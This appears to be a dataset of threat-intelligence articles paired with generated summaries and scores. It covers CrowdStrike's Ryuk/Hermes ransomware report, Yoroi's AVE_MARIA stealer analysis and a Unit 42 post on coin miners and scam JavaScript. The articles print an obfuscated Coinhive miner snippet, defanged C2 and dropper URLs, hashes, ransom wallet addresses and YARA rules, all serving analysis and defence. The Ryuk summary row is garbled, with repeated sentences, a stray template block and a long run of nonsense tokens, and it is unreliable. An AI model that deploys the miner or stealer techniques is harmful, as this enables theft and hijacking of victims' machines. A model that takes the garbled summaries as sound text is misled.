the marker HERMES but not the exported AES key.Figure 6. Example Hermes Footer in FEIB SWIFT Attack with Encrypted AES Key MissingWithout the encrypted AES key appended to the encrypted files, even if the private key used for encryption was recovered, the files could not be decrypted. Therefore, the Hermes executable used in the FEIB SWIFT attack appears never to have been used to ransom the machine, but rather to destroy the victim's data.Criminal Actors Operating from RussiaFalcon Intelligence has medium-high confidence that the WIZARD SPIDER threat actors are operating out of Russia. Hermes was originally advertised on exploit[.]in . This Russian-speaking forum is a well-known marketplace for selling malware and related services to criminal threat actors. If Hermes was indeed related to STARDUST CHOLLIMA, it would imply that nation-state threat actors are selling their services on Russian-speaking forums, which is unlikely.The Russian threat actor attribution theory is also supported by an early advertisement for Hermes, which stated that their ""software did not work and will on work on RU, UA, BY"" [sic]. This refers to functionality implemented in Hermes to check the host to ensure that it is not running on a Russian, Ukrainian, or Belarusian system. To check the host language, it queries the registry key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language\ and the value InstallLanguage . If the machine has the value 0419 (Russian), 0422 (Ukrainian) or 0423 (Belarusian), it call ExitProcess to stop executing. This functionality is commonly included by malware developers and sellers who are operating in Russia to reduce their risk of attracting local law enforcement's attention and criminal prosecution.While supporting an incident response investigation involving Ryuk, Falcon Intelligence noticed files related to the investigation being uploaded to a file-scanning website from an IP address in Moscow, Russia. The file in question was a variant of kill.bat that contained commands previously only observed executed by Ryuk calling ShellExecute . The files could have been uploaded by a victim in Russia, but the time frame between the functionality being removed from Ryuk binaries and included in kill.bat was very short. The most likely scenario is that threat actors were testing whether kill.bat would be detected by antivirus engines.Also, during forensic investigation of a network compromised by WIZARD SPIDER, CrowdStrike Services recovered artifacts with filenames in Russian. One file was named !!! files dlya raboty !!!.rar , which translates to ""files for work."" Based on these factors, there is considerably more evidence supporting the hypothesis that the WIZARD SPIDER threat actors are Russian speakers and not North Korean.How CrowdStrike Can Prevent RyukThe Falcon platform has the ability to detect and prevent Ryuk by taking advantage of the behavioral patterns indicated by the ransomware. By turning on suspicious process blocking, Falcon ensures that Ryuk is killed in the very early stages of execution. In addition, CrowdStrike's machine learning (ML) algorithm provides additional coverage against this malware family, as illustrated below.AppendixKnown Ryuk BTC Wallet Addresses and PaymentsBTC Address Total Received No Received Total Value (USD) 12vsQry1XrPjPCaH8gWzDJeYT7dhTmpcjL 55.00 3 $221,685.46 1Kx9TT76PHwk8sw7Ur6PsMWyEtaogX7wWY 182.99 10 $734,601.91 1FtQnqvjxEK5GJD9PthHM4MtdmkAeTeoRt 48.250 4 $188,974.93 14aJo5L9PTZhv8XX6qRPncbTXecb8Qohqb 25.00 2 $113,342.70 1E4fQqzCvS8wgqy5T7n1DW8JMNMaUbeFAS 0.001 1 $6.47 1GXgngwDMSJZ1Vahmf6iexKVePPXsxGS6H 30.00 3 $132,654.91 1Cyh35KqhhDewmXy63yp9ZMqBnAWe4oJRr 0.00 0 $0.00 15LsUgfnuGc1PsHJPcfLQJEnHm2FnGAgYC 0.00 0 $0.00 1CbP3cgi1Bcjuz6g2Fwvk4tVhqohqAVpDQ 13.00 2 $82,917.49 1Jq3WwsaPA7LXwRNYsfySsd8aojdmkFnW 35.00 1 $221,979.83 129L4gRSYgVJTRCgbPDtvYPabnk2QnY9sq 0.00 0 $0.00 1ET85GTps8eFbgF1MvVhFVZQeNp2a6LeGw 3.325 1 $12,661.74 1FRNVupsCyTjUvF36GxHZrvLaPtY6hgkTm 38.99 3 $246,893.95 1CW4kTqeoedinSmZiPYH7kvn4qP3mDJQVa 24.077 2 $152,727.13 13rTF3AYsf8xEdafUMT5W1E5Ab2aqPhkPi 0.00 0 $0.00 17zTcgKhF8XkWvkD4Y1N8634Qw37KwYkZT 0.00 0 $0.00 14dpmsn9rmdcS4dKD4GeqY2dYY6pwu4nVV 0.00 0 $0.00 17v2cu8RDXhAxufQ1YKiauBq6GGAZzfnFw 0.00 0 $0.00 1KUbXkjDZL6HC3Er34HwJiQUAE9H81Wcsr 10.00 1 $63,358.27 12UbZzhJrdDvdyv9NdCox1Zj1FAQ5onwx3 0.00 0 $0.00 1NMgARKzfaDExDSEsNijeT3QWbvTF7FXxS 0.00 0 $0.00 19AE1YN6Jo8ognKdJQ3xeQQL1mSZyX16op 25.00 1 $164,774.21 1L9fYHJJxeLMD2yyhh1cMFU2EWF5ihgAmJ 40.035 4 $259,478.16 18eu6KrFgzv8yTMVvKJkRM3YBAyHLonk5G 30.00 1 $198,651.35 1C8n86EEttnDjNKM9Tjm7QNVgwGBncQhDs 30.0082 2 $194,113.76 12N7W9ycLhuck9Q2wT8E6BaN6XzZ4DMLau 0.00 0 $0.00 162DVnddxsbXeVgdCy66RxEPADPETBGVBR 0.00 0 $0.00 1ChnbV4Rt7nsb5acw5YfYyvBFDj1RXcVQu 28.00 2 $175,177.98 1K6MBjz79QqfLBN7XBnwxCJb8DYUmmDWAt 1.7 2 $12,455.95 1EoyVz2tbGXWL1sLZuCnSX72eR7Ju6qohH 0.00 0 $0.00 1NQ42zc51stA4WAVkUK8uqFAjo1DbWv4Kz 0.00 0 $0.00 15FC73BdkpDMUWmxo7e7gtLRtM8gQgXyb4 0.00 0 $0.00 14hVKm7Ft2rxDBFTNkkRC3kGstMGp2A4hk 10.00 2 $64,990.62 1CN2iQbBikFK9jM34Nb3WLx5DCenQLnbXp 15.00 1 $92,934.80 1LKULheYnNtJXgQNWMo24MeLrBBCouECH7 0.00 0 $0.00 15RLWdVnY5n1n7mTvU1zjg67wt86dhYqNj 50.41 3 $326,477.83 1KURvApbe1yC7qYxkkkvtdZ7hrNjdp18sQ 0.00 0 $0.00 1NuMXQMUxCngJ7MNQ276KdaXQgGjpjFPhK 10 1 $41,034.54IndicatorsThe following table contains the hashes of recently compiled Ryuk payloads:SHA256 Build Time (UTC) 795db7bdad1befdd3ad942be79715f6b0c5083d859901b81657b590c9628790f 2018-12-27 01:10:12 501e925e5de6c824b5eeccb3ccc5111cf6e312258c0877634935df06b9d0f8b9 2018-12-21 02:33:34 fe909d18cf0fde089594689f9a69fbc6d57b69291a09f3b9df1e9b1fb724222b 2018-12-21 00:15:31The following table contains hashes of Hermes executables that were previously analyzed:SHA256 Build Time (UTC) ac648d11f695cf98993fa519803fa26cd43ec32a7a8713bfa34eb618659aff77 2018-07-20 13:35:25 5e2c9ec5a108af92f177cabe23451d20e592ae54bb84265d1f972fcbd4f6a409 2018-07-23 03:47:58 78c6042067216a5d47f4a338dd951848b122bbcbcd3e61290b2f709543448d90 2018-07-1522:37:30Additional Resources";"The Ryuk ransom note is written to a file named RyukReadMe.txt. A number of different ransom note templates have been observed. The body of the template is static with the exception of the email address and the Bitcoin (BTC) wallet address, which may change. The email addresses usually contain one address at protonmail.com and another address at tutanota.com. The email names typically are esoteric actors and directors, but Instagram models have also been observed. Interestingly, the ransom note in Figure 3 is remarkably similar to the BitPaymer ransom notes. As of this writing, it remains unclear if WIZARD SPIDER is copying the TTPs (tactics, techniques and procedures) and ransom notes of BitPaymer, or whether the groups may share information with each other. Ryuk ransomware is a variant of Hermes ransomware, which was first distributed in February 2017. Hermes was originally sold on forums for $300 USD. When purchased, the buyer received a build that supported two email addresses, a decryptor and a unique RSA key pair. If the purchaser desired more email addresses, they were required to purchase another build for an additional $50. The seller of Hermes ransomware appears to have stopped or limited advertising on forums in 2017. The ITSecurity report states that the seller of Hermes ransomware appears to have stopped or limited advertising on forums in 2017. Early versions of Hermes were reportedly installed via internetaccessible RDP servers protected by weak credentials. In October 2017, Hermes was deployed as a destructive distraction for a Society for Worldwide Interbank Financial Telecommunication (SWIFT) compromise at the Far Eastern International Bank (FEIB) in Taiwan. Hermes' role in the SWIFT attack is described in more detail in the Attribution section at the end of this blog. In March 2018, Hermes was observed targeting users in South Korea via the GreenFlash Sundown exploit kit. In midAugust 2018, a modified version of Hermes, dubbed Ryuk, started appearing in a public malware repository. Ryuk was tailored to target enterprise environments and some of the modifications include removing antianalysis checks. These checks include querying the Process Environment Block (PEB) to see if the field is BeingDebugged , or querying the PEB to see if the field NtGlobalFlag has been set; checking to see if the host is running VirtualBox by calling the instruction CPUID; and ensuring that the host language is not Russian, Ukrainian, or Belarusian. From a process and file perspective, Hermes and Ryuk target files in a similar fashion. The core differences are Ryuk's logic that handles file access, and the use of a second, embedded public RSA key. The following are characteristics that have not changed: Encrypts files using RSA2048 and AES256 Stores keys in the executable using the proprietary Microsoft SIMPLEBLOB format Encrypts mounted devices and remote hosts Uses a file The Ryuk ransomware is a variant of the Hermes ransomware. It uses a combination of symmetric (AES) and asymmetric (RSA) encryption to encrypt files. The dropper checks whether the host is 32bit or 64bit by calling IsWow64Process and writes one of two embedded payload executables corresponding to the host's architecture. The Ryuk payload executable written by the dropper is the Ryuk component that contains the core logic for encrypting files on the host. Compared to other families of ransomware, Ryuk has very few safeguards to ensure stability of the host by not encrypting system files. For example, many ransomware families contain extensive lists of file extensions or folder names that should not be encrypted (whitelisted), but Ryuk only whitelists three extensions: It will not encrypt files with the extensions exe, dll , or hrmlog . The last extension appears to be a debug log filename created by the original Hermes developer. It should be noted that absent from this list is sys (system drivers), ocx (OLE control extension) and other executable file types. Encrypting these files could make the host unstable. Early versions of Ryuk included the whitelisting of ini and lnk files, but these have been removed in recent builds. The following folder names are also whitelisted and not encrypted.ChromeMozillaRecycle.binWindowsMicrosoftAhnLabThis is only a small subset of folder names that should be whitelisted in order to ensure stability on the host. While doing dynamic analysis, it was not uncommon to observe Ryuk attempting to encrypt files related to the Windows Bootloader ( C:\Boot ) or other critical files and folders. Due to the absence of proper whitelisting, an infected machine can become unstable over time and unbootable if Due to the absence of proper whitelisting, an infected machine can become unstable over time and unbootable if restarted. As mentioned in the Hermes to Ryuk section, Ryuk uses a combination of symmetric (AES) and asymmetric (RSA) encryption to encrypt files. Without the private key provided by WIZARD SPIDER, the files cannot be decrypted and are unrecoverable. A thread is created for the encryption of each file and each file is encrypted with its own AES key. After the file has been encrypted, a file extension of .RYK is appended to the file. All directories will have a ransom note of ( RyukReadMe.txt ) written to the directory. Ryuk attempts to encrypt all mounted drives and hosts that have Address Resolution Protocol (ARP) entries (IP addresses) and it enumerates all mounted drives by calling GetLogicalDrives . For each mounted drive, Ryuk calls GetDriveTypeW to determine the drive's type. If the drive type is not a CDROM, files on the drive are encrypted. To retrieve IP addresses that have ARP entries, Ryuk calls GetIpNetTable . It iterates through all entries and then tries to enumerate files and folders on the remote host and encrypt the files. PersistenceCurrent builds of Ryuk no longer contain persistence functionality. Previously, to remain persistent on the host, Ryuk created a registry entry under the Run key using Windows cmd.exe shell. The following command line was used to write to the Registry Run Key name svchos to HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run with the value being the path to the Ryuk executable. Process Injection Ryuk does not encrypt files from within its own process memory space, but injects into a remote process. Before injecting into a ITSecurity Report Summary The ITSecurity report summarizes the findings of the ITSecurity assessment. The report provides an overview of the ITSecurity risks and vulnerabilities identified during the assessment. The report also provides recommendations on how to mitigate the identified risks and vulnerabilities. ### Output: The ITSecurity report summarizes the findings of the ITSecurity assessment. The report provides an overview of the ITSecurity risks and vulnerabilities identified during the assessment. The report also provides recommendations on how to mitigate the identified risks and vulnerabilities. Falcon Intelligence assesses that STARDUST CHOLLIMA likely had access to the Hermes source code, or a third party compiled and built a new version for them. ap from [ in the from from from from from from from from [. [. [. [. [. [. [: [: [: [: [: [ of [ of [ of [ of [ of [ of [ of [ of [ of [ of [ of [ of [ of [ of [ of [ of [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ of [ of [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ to in to in to in in in [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ to of [ to [ to [ to [ with [ with [ with [ with [ [ [ [ [ [ [ [ [ [ [ [. [. [. [. [ [ with [ [ [ [ [ [ [ [ [ [ [ of [ of of of of of of of of of [ with, [. with with, as as as as as [. [. in in in in in in in in in in in in [ for [ for [ [ for [ [ [ [ [ with [ with [ with [ with [. [. [. [.. for as for as................ [. [. [. [.. [. [ [ [ [ [ [ [ [ [ [ [ [ [ of [ of of of of of of of of of of of of of of of of of [. [. [. [. [. [. [. [. [. [. to [. to [ [ [ [. to [. to [0 to of the of the to [. to [. [. [. [ [. [. [";en;{'r': 0.3068920676202861, 'p': 0.9309664694280079, 'f': 0.46161368820240917};{'r': 0.2343271106157704, 'p': 0.8760416666666667, 'f': 0.3697515904268806};{'r': 0.3068920676202861, 'p': 0.9309664694280079, 'f': 0.46161368820240917}
https://yoroi.company/research/the-ave_maria-malware/;The “AVE_MARIA” Malware;"The Cybaze-Yoroi ZLab researchers analyzed phishing attempts spreading in the last days of the past year against an italian organization operating in the Oil&Gas sector. The malicious emails try to impersonate a supplier's sales office sending invoices and shipping orders confirmations. As usual, the mail conveys malicious Excel files exploiting the popular CVE-2017-11882 vulnerability to run an executable retrieved from a malicious website, previously compromised by the attackers.The domains used to vehicle the malicious messages remained active only for few days in the middle of December, just the time needed to spread phishing emails.Figure 1. The sender's domains were active from 12 to 14 Dec 18The Cybaze-Yoroi ZLab analyzed and dissected the payload delivered during these days.Technical analysisThe actual infection chain starts from the self-extracting archive (SFX) dropped by after the opening of the malicious Office document. The sample contains the image of Kagamine Rin as icon, a character belonging to the singing voice synthesizer software dubbed VOCALOID.The file is a WinRAR self-extractor configured to unpack its contents into the temporary folder ""%TEMP%\04505187"" and then silently run a specific setup routine:Figure 2. Configuration of the SFX extractorThe timestamp of the compressed files shows the attacker weaponized the archive at 22:56 of 13th December 2018, within the domain activation time-span.Figure 3. Files extracted by SFX executableAll the files have misleading extension to confuse the analysis and most of them are text files containing junk data. But three of these files deserve further attention:xfi.exe: a legit AutoIt interpreter, it is able to execute a specified AutoIt script.hbx=lbl: the first AutoIt script, it is obfuscated hiding the instructions among an huge number of comments.uaf.icm: file containing all the malware settings such as the installation folder, the interpreter name and other parameters used in the next stages, it is structured according to the ""INI file format"".Figure 4. Appearance of the first AutoIt script (called ""hbx-lbl"").Figure 5. uaf.icm's structure.Similar packing of AutoIT code have been observed even by Juniper back in 2016, where SFX files were abused this way to deliver scripts used as first stage of the malware. As shown in the configuration in Figure 2, the sample able to run the first script using the command:$> xfi.exe hbx=lblAt this point, using the encoded data contained into ""uaf.icm"" between the string pattern ""[sData]"" and ""[esData]"", the first script creates a second one, with a random name (es. ""ZZQLZ""), and runs it using ""xfi.exe"" engine.Figure 6.The second script is binary-encoded and hidden into the uaf.icm file between ""[sData]"" and ""[esData]"".The second script is heavily obfuscated using binary-encoding. After deobfuscation, it reveals interesting capabilities. First of all, there are different evasion techniques, such as a check about the current running processes: if there is a process related to some virtualization software, like Virtualbox, the malware kills itself.Figure 7.Example of malware evasion.The main purpose of the second script is to decrypt and execute the final payload hidden inside ""[Data]"" and ""[eData]"" delimiter strings of the ""uaf.icm"" file. The data is decrypted using the ""Advapi32.dll!CryptDecrypt"" Microsoft function, which is dynamically invoked into the AutoIt script through the high-level API ""DllCall"". The decryption key is retrieved from the usual settings file.It is interesting the way used by the AutoIt script to run the just extracted payload. In the first instance, the malware creates a copy of legit Regsvcs.exe, the .NET Services Installation Tool, into %TEMP% folder and runs it. Then, it performs a process injection in order to start the malicious payload behind the Regsvcs process.In the following figure, it is shown the routine to extract, decrypt and inject the malicious binary stored into ""uaf.icm"" settings file.Figure 8.Example of malware evasion.The malware uses the CallWindowProcW Windows function as process injection technique, through DllCall AutoIt API.Figure 9.Function to decrypt and inject malicious payload into legit process.The malware author used a custom shellcode stored into $ASM variable to correctly inject the binary payload into the running regsvcs process.Finally, the second AutoIt script provides to set persistence onto the victim's machine writing the registry key HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run.Figure 10.Registry key set by the malware.The registry key's name corresponds to the value extracted from ""uaf.icm"" settings file at the section ""Key"".The Payload: AVE_MARIA StealerThe payload injected into legit .NET process shows a typical bot behavior: it contacts a C2 hosted on anglekeys.warzonedns[.]com and retrieves the next action to perform. The attacker' server is currently down, so it is not possible to obtain further stages of the commands.A static investigation shows the malware looks for the installed e-mail client, like Microsoft Exchange Client or Outlook, to exfiltrate victim's credentials.Figure 11.Research of the installed email client software.Moreover, the bot is able to decrypt all the credentials stored by Firefox browser. These sensitive data are protected using PK11 encryption from Mozilla Network Security Services, so the malware is weaponized with all the necessary functions decrypt them.The malware writer re-used publicly available code to implement this functionality. The following screen shows part of the execution flow (on the left) and a piece of code belonging to a KeePass plugin (on the right) published on github, these two flows are very similar.Figure 12.Malware's piece of code (on the left), KeePass plugin's piece of code (on the right).In addition, the malware embeds an utility able to bypass the User Access Control within the resource section. It abuses a vulnerability of the ""pkgmgr.exe"" Windows tool, many resources related to this exploit are publicly available on the internet.Figure 13.Workflow of the UAC bypass utility.Despite the wide malware's capabilities, the writer left some evidences referring to his environment into the malicious code.Figure 14.Probable address path of the malware writer's workspace.Finally, another strange string is emerged from the executable: ""AVE_MARIA"". Which is used as HELLO message when the malware correctly contacts the C2. This particular string has been elected as common malware name by many researchers of the InfoSec community.Figure 15.The characteristic string sent by the malware.ConclusionThe first stages of the malware, including the AutoIt scripts, are very similar to another malware waves analyzed few years ago by third party security researchers: the malware logic, based on an INI settings file, and some pieces of AutoIt code are the same but the final payload is different.It's possible the author of these malware is the same, showing an increasing complexity of implant, or also the first stage of the malware may have been purchased in the dark markets and the author of the ""AVE_MARIA"" malware composed a new stealer using publicly available code, forgetting to wipe the information related to him.Indicator of CompromiseFileName sha256 description DSK.exe 4576d9940db9a748378a7e7d8c0edc048529ed72ef5161ed4a75c5612da3d5d9 SFX dropper hbx=lbl 6fff30ad7d09e11e85614de11ea3607ed39c2c6ed2cca481d7e54b506c423707 AutoIt script dropper 1 xfi.exe 237d1bca6e056df5bb16a1216a434634109478f882d3b1d58344c801d184f95d Legit AutoIt engine uaf.icm 7b5a8198138abc2436d92dfcd16f0be26e8783a51e42d2a4ad5334686f4c9140 Malware settings file ZZQLZ 02cb295e95881abca2fe85fadc4228a932a12ea0d1fa6b961a38d789e7b8287f AutoIt script dropper 2 payload 81043261988c8d85ca005f23c14cf098552960ae4899fc95f54bcae6c5cb35f1 AveMaria payload uac_bypass 021d01fe3793879f57a2942664fc7c096710e94e87ad13dc21467c12edf61546 UAC_bypass utilityMalspam Sending domains sentinelx[.tk xinchingho[.mlDroprul hxxps://www.masaimaranationalparkkenya[.com/wp-admin/js/jsk/DSK.exeC2: anglekeys.warzonedns[.com 192.3.162[.161Yara Rulesrule SFX_AutoIt_dropper_09_01_2019{ meta: description = ""Yara Rule for SFX dropper"" author = ""Cybaze Zlab_Yoroi"" last_updated = ""2019_01_09"" tlp = ""white"" category = ""informational"" strings: $a1 = ""CryptProtectMemory"" $a2 = {2A 3F ?? ?? ?? ?? 72 61 72} $b = {4D 5A} $c = {CE E8 DC F8 FF FF 56 E8 A3 80 FF FF 59 33 C0 5E} $d = ""publicKeyToken=\""6595b64144ccf1df\"""" $e = {7B 65 32 30 31 31 34 35 37 2D 31 35 34 36} condition: $b and $c and $d and $e and 1 of ($a*) } rule AveMaria_infostealer_09_01_2019{ meta: description = ""Yara Rule for AveMaria infostealer"" author = ""Cybaze Zlab_Yoroi"" last_updated = ""2019_01_09"" tlp = ""white"" category = ""informational"" strings: $a1 = ""PK11SDR_Decrypt"" $a2 = {70 69 6E 67 2E 65 78 65} $a3 = {4D 5A} $a4 = {31 32 37 2E 30 2E 30 2E 32} $a5 = {4D D0 8B 46 08 33 C2 23 C7 C1 CF} $a6 = ""AVE_MARIA"" condition: all of them }This blog post was authored by Antonio Farina, Luca Mella, Antonio Pirozzi of Cybaze-Yoroi Z-LAB";"The CybazeYoroi ZLAB researchers analyzed phishing attempts spreading in the last days of the past year against an italian organization operating in the Oil&Gas sector. The malicious emails try to impersonate a supplier's sales office sending invoices and shipping orders confirmations. As usual, the mail conveys malicious Excel files exploiting the popular CVE201711882 vulnerability to run an executable retrieved from a malicious website, previously compromised by the attackers. The domains used to vehicle the malicious messages remained active only for few days in the middle of December, just the time needed to spread phishing emails. Figure 1. The sender's domains were active from 12 to 14 Dec 18 Figure 2. Configuration of the SFX extractor Figure 3. Files extracted by SFX executable Figure 4. Appearance of the first AutoIt script (called ""hbxlbl"") Figure 5. uaf.icm's structure Figure 6.The second script is heavily obfuscated using binaryencoding. The ITSecurity report reveals the presence of a malicious AutoIt script embedded into the uaf.icm settings file. The malware author used a custom shellcode stored into $ASM variable to correctly inject the binary payload into the running regsvcs process. Moreover, the bot is able to decrypt all the credentials stored by Firefox browser. These sensitive data are protected using PK11 encryption from Mozilla Network Security Services, so the malware is weaponized with all the necessary functions decrypt them. The malware embeds an utility able to bypass the User Access Control within the resource section. This blog post was authored by Antonio";en;{'r': 0.23179791976225855, 'p': 0.9341317365269461, 'f': 0.37142856824288556};{'r': 0.1740958788898234, 'p': 0.8697478991596639, 'f': 0.29011912826481384};{'r': 0.23179791976225855, 'p': 0.9341317365269461, 'f': 0.37142856824288556}
https://unit42.paloaltonetworks.com/caught-in-the-act-from-intrusive-coin-miners-to-scam-websites/;Caught in the Act: From Intrusive Coin Miners to Scam Websites;"This post is also available in: ??? (Japanese)At Palo Alto Networks, we use various methods to detect malicious web pages and malicious JavaScript on websites our customers visit online. In addition to static approaches such as signature matching, our security crawlers execute all scripts discovered on web pages and observe their dynamic behavior. Then, we apply special behavioral signatures based on different indicators, such as global variables declared during runtime, popup messages shown to the user, established WebSocket connections, and others. Using such signatures we are able to detect malicious campaigns even in obfuscated, packed, or randomized JavaScript, as final malicious behavior remains the same. In particular, this method proved efficient in discovering such modern threats as intrusive coin miners (previously described here) and numerous kinds of scam campaigns.In November 2018, we detected 8,712 distinct URLs with intrusive coin miners, which our customers attempted to visit more than one million times from more than 30,000 devices. In addition to the most popular, Coinhive, only a few other libraries are noticeably present, such as JSE-Coin, Crypto-Loot, and CoinImp. Unlike dedicated malicious websites that serve no other legitimate purposes, coin mining scripts are sometimes injected voluntarily into popular video streaming sites, therefore their domains are significantly more long living and popular than sites hosting other types of malicious JavaScripts. However, with behavioral analysis we can separate unauthorized coin mining (which starts without user consent), and thus detect and denylist really intrusive cases.In addition, we captured 4,633 additional distinct URLs that lead to scams, clickjacking, phishing, and other malicious JavaScripts that were frequently targeting our customers from around the globe. Two of the most observed scam campaigns were technical support scam and fake Flash update pages.Trends in Malicious JavaScriptFrom October 19, 2018 to November 19, 2018, we applied behavioral analysis to URLs coming from Palo Alto Networks customers that were unknown to our URL filtering categories on a daily basis. We then crawled Alexa's top one million URLs as well as a feed of recently registered domains. Overall, we detected 9,104 coin mining scripts (over 8,712 distinct URLs), and 4,788 other malicious JavaScripts (over 4,633 distinct URLs), which were undetectable using static analysis.Results for Coin MinersOn average, we were detecting 1,097 coin mining URLs per day, including 184 previously unseen malicious URLs. Figure 1 shows the daily detection rates in detail (note, this is not a cumulative plot as it shows independent results per each day). Despite minor periodic drops in number, the overall trend of newer detections remains stable over time. Also, we keep detecting the same coin miners from day to day, highlighting the fact that coin mining websites are longer living compared to other more indisputable kinds of malicious JavaScript, such as phishing or exploits.Figure 1. Daily detection rate of coin mining URLsFigure 2 illustrates the distribution of popular families of coin miners among 9,104 scripts detected during the mentioned month. As we can see, Coinhive is leading with 46.8%, followed by 12.6% of anonymous Stratum Protocol communications. While other coin mining libraries trail behind, such as JSE-Coin (10.9%), Crypto-Loot (10%), CoinImp (6.7%), Monerise (6.6%), and NeroHut (1.4%). Interestingly, more than ten other coin mining libraries, including CoinNebula, BatMine, DeepMiner, CryptoNoter, Minr and others, collectively contribute to only 5% of all the detected scripts. This is possibly an indication of a change in coin mining trends, as we were detecting more of those libraries previously. Moreover, during past month we did not observe several libraries that were detected up to three months ago, namely WebXMR, ProjectPoi, and Grindcash.Figure 2. Top recently observed coin miners6,026 out of the 8,712 URLs with coin miners, or 69.1%, perform ""unauthorized"" coin mining. In other words, they start mining immediately after visiting the page, without asking users for consent. The most popular choice among coin mining libraries to perform unauthorized mining were CoinImp (unauthorized in 100% cases over 612 scripts), Crypto-Loot (in 86% cases over 906 scripts), Coinhive (in 77.7% cases over 3,312 scripts), and other 1,143 scripts generating unidentified stratum traffic.At the same time, we observe many coin mining campaigns deploy additional techniques to remain stealthy. These include tactics such as static obfuscation and packing of their code. For example, we encountered many variations of mining JavaScript libraries similar to the one below, served from custom servers and usually named unrecognizably or even pretending to be popular benign scripts, such as ""jquery.min.js"".(function(){ var _0xdf51=[""\x70\x61\x72\x61\x6D\x73"",""\x5F\x73\x69\x74\x65\x4B\x65\x79"",""\x5F\x75\x73\x65\x72"",""\x5F\x74\x68\x72\x65\x61\x64\x73"",""\x5F\x68\x61\x73\x68\x65\x73"",""\x5F\x63\x75\x72\x72\x65\x6E\x74\x4A\x6F\x62"",""\x5F\x61\x75\x74\x6F\x52\x65\x63\x6F\x6E\x6E\x65\x63\x74"", ... MINER_URL:_0xdf51[207],AUTH_URL:_0xdf51[208]},CoinHive[_0xdf51[104]]= CoinHive.Res(_0xdf51[209]),var user=window[_0xdf51[211]][_0xdf51[210]]|| _0xdf51[212],miner= new CoinHive.User(_0xdf51[213],user,{throttle:0.3}),miner[_0xdf51[89]]()|| miner[_0xdf51[53]]() })(), 1 2 3 4 5 6 7 8 9 ( function ( ) { var _0xdf51 = [ ""\x70\x61\x72\x61\x6D\x73"" , ""\x5F\x73\x69\x74\x65\x4B\x65\x79"" , ""\x5F\x75\x73\x65\x72"" , ""\x5F\x74\x68\x72\x65\x61\x64\x73"" , ""\x5F\x68\x61\x73\x68\x65\x73"" , ""\x5F\x63\x75\x72\x72\x65\x6E\x74\x4A\x6F\x62"" , ""\x5F\x61\x75\x74\x6F\x52\x65\x63\x6F\x6E\x6E\x65\x63\x74"" , . . . MINER_URL : _0xdf51 [ 207 ] , AUTH_URL : _0xdf51 [ 208 ] } , CoinHive [ _0xdf51 [ 104 ] ] = CoinHive . Res ( _0xdf51 [ 209 ] ) , var user = window [ _0xdf51 [ 211 ] ] [ _0xdf51 [ 210 ] ] || _0xdf51 [ 212 ] , miner = new CoinHive . User ( _0xdf51 [ 213 ] , user , { throttle : 0.3 } ) , miner [ _0xdf51 [ 89 ] ] ( ) || miner [ _0xdf51 [ 53 ] ] ( ) } ) ( ) ,In such cases, matching of static signatures and file hashes can be challenging as they are almost always unique, but when we execute these scripts, it is straightforward to detect the same known global variables created on the page, namely ""CoinHive"" and ""miner"". Moreover, the process of coin mining can also be detected by analyzing the WebSocket traffic.As a result, at least 1,414 out of 4,264 Coinhive scripts, or 33.2%, were detected only because we were using dynamic analysis with behavioral signatures. Other methods, such as hash matching of the abstract syntax tree, could not bypass the obfuscation.It is worth mentioning that we detected many cases when the same web page rotates coin miners from visit to visit or hosts several different coin mining libraries at the same time. For examples, such pairs as Coinhive and JSE-Coin, or Crypto-Loot and NeroHut are common. Figure 3 illustrates a screenshot for one of such case, when both libraries start to mine immediately after visiting the page. Due to these occurrences, the overall number of detected mining scripts for one month (9,104) was greater than the overall number of unique URLs (8,712).Figure 3. Example of a website with two active coin minersResults for Scam JavaScriptAs for other malicious JavaScripts (excluding coin miners), we were able to detect around 184 additional URLs per day, and around 143 new URLs. Figure 4 shows the daily detection rates. As shown, rates for the overall detected URLs and newly discovered URLs are much closer to each other than on Figure 1 for coin miners. This means that URLs hosting scam-related JavaScript are shorter lived and are less likely to be observed for many days in a row.Figure 4. Daily detection rate of scam URLsOutside of coin miner JavaScript attacks, we also discovered 4,788 non-mining malicious samples with the distribution seen in Figure 6. As we mentioned earlier, technical support scams and fake Flash update scams were the most popular malicious campaigns of November 2018 (examples of such malicious pages are shown on Figure 5). At the same time, other types of malicious scam campaigns include phishing kits, clickjacking kits, fake reward and other kinds of modern scams.Figure 5. Screenshots of the most popular scam pages in November 2018Figure 6. Top recently observed on-mining malicious JavaScriptsParticularly interesting is the case of technical support scam pages, which trick users into calling and paying scammers or installing unwanted programs. Analyzing these pages revealed evidence indicating they may all be associated with a single actor group. First, of the 1,989 found URLs that lead to technical support scams, at least 1,668 resulted in the same page with the same screenshot, such as the one shown on the left of Figure 6. These pages were showing JavaScript popups with the same alarming text:""Warning!Microsoft Windows system has detected that your Windows 7 7 is currently outdated and corrupted.This will automatically erase your system files.Please follow the instructions immediately to resolve this issue and ensure that your system is always up to date."" 1 ""Warning!Microsoft Windows system has detected that your Windows 7 7 is currently outdated and corrupted.This will automatically erase your system files.Please follow the instructions immediately to resolve this issue and ensure that your system is always up to date.""Second, many recent landing pages of these URLs were hosted on domains that followed the same pattern according to the regex below (for example, ""gaf9342[.]space"" and ""gba9462[.]site"").g[a-z]{2}[0-9]{4}.(online|space|site|website|host) 1 g [ a - z ] { 2 } [ 0 - 9 ] { 4 } . ( online | space | site | website | host )In comparison, the Fake flash update pages were more adaptive to the victim, showing different pages in cases of Google Chrome vs. Internet Explorer, and MS Windows vs. Mac OS. In addition, fake Flash campaigns update their popup texts more frequently. For example, below is the most common text in fake Flash on-page alerts:""WARNING! Your official Adobe <u>Flash Player</u> version is out of date. Please install latest software update to continue. Please click \""Update\"" to continue."" 1 ""WARNING! Your official Adobe <u>Flash Player</u> version is out of date. Please install latest software update to continue. Please click \""Update\"" to continue.""It is important to emphasize that exact text matches of such alerts would result in a limited number of detections, instead we train our models based on the most significant terms associated with scams. Therefore, we are prepared for different text randomization and obfuscation tricks that attackers may apply, such as double spaces between key words as with ""Flash Player"" above, injection of new lines, and messages in other languages.Other types of malicious JavaScript, such as redirectors/injectors, droppers, and exploits were not as widely detected by behavior-based approaches in November (less than 1% according to Figure 6). Such threats includes simpler scripts such as redirectors, which 